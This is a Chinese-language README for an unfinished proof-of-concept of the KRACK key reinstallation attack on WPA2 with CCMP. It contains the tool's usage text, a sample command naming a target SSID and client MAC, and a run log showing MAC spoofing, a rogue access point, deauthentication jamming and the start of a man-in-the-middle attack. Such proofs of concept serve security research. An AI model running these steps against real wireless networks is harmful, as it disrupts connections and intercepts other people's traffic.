# [工作中] PoC Krack (Key Reinstallation AttaCKs)

使用基于信道的MitM进行Krack攻击的概念证明

## 原理

参考法文文档 [hackndo](http://beta.hackndo.com/krack/)

## 环境

WPA2 with CCMP

## 用法

```
# ./Krack.py -h
usage: Krack.py [-h] [-d] -a AP_NAME -i IFACE_AP -b STA_MAC -j
                IFACE_CLIENT -c CHANNEL

optional arguments:
  -h, --help            显示帮助信息
  -d, --direct          跳过信道和监视设置
  -a ACCESS_POINT, --access_point ACCESS_POINT
                        输入目标AP的SSID
  -i IFACE_AP, --iface_ap IFACE_AP
                        分配给目标AP使用的无线网卡名称
  -b CLIENT, --client CLIENT
                        输入目标STA的MAC地址
  -j IFACE_CLIENT, --iface_client IFACE_CLIENT
                        分配给目标STA使用的无线网卡名称
  -c CHANNEL, --channel CHANNEL
                        选择目标AP正在侦听的信道

# ./Krack.py -a hackndo_ssid_test -i wlan1 -b "ab:cd:0a:0b:11:22" -j wlan0 -c 11
[*] Turning off both interfaces
[*] Setting interface wlan1 on channel 11
[*] Interface wlan1 is on channel 11
[*] Setting interface wlan0 on channel 4
[*] Interface wlan0 is on channel 4
[*] Starting monitor mode for wlan1
[*] Interface wlan1 is now in monitor mode
[*] Starting monitor mode for wlan0
[*] Interface wlan0 is now in monitor mode
[*] Turning on both interfaces
[*] Trying to find hackndo_ssid_test MAC address
[*] MAC Found ! 0e:cc:46:8a:b1:09
[*] Jammer initialized correctly
[*] Sniffing an AP Beacon...
[*] AP Beacon saved!
[*] Sniffing an AP Probe response...
[*] AP Probe response saved!
[*] Updating wlan1 MAC address to ab:cd:0a:0b:11:22 (Client MAC)
[*] wlan1 MAC address update successful
[*] Updating wlan0 MAC address to 0e:cc:46:8a:b1:09 (Real AP MAC)
[*] wlan0 MAC address update successful
[*] Rogue AP started. Sending beacons...
[*] Running main loop
[*] Starting deauth on AP 0e:cc:46:8a:b1:09 (hackndo_ssid_test) and client ab:cd:0a:0b:11:22...
[*] Probe request to our AP
[*] Client authenticated to our AP!
[*] MitM attack has started
[*] Deauth stopped
```

## TODO

- [X] 在deauth后使用CSA (Channel Switch Announcement)让客户端切换信道(查看问题 [#1](https://github.com/Hackndo/krack-poc/issues/1))
- [ ] 保存客户端发送的数据
- [ ] 计数器重新初始化时，用已知的纯文本解密密码
